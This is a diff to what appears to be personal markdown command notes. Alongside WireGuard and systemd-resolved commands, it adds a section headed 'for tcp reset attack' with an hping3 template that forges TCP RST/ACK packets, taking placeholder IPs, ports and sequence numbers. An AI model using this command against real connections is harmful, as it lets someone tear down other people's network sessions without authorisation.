@@ -363,3 +363,8 @@ sudo wg-quick down wgcf-profile
 sudo wg-quick up wgcf-profile
 systemctl start systemd-resolved.service # the service has to be open
 ```
+
+# for tcp reset attack
+```bash
+hping3 [des ip] -s [src port] -p [des port] -A -R -M [seq num "not realtive"] -L [ack num "not relative"] -c [num of reset flags you want to sent "usualy 1"]
+```
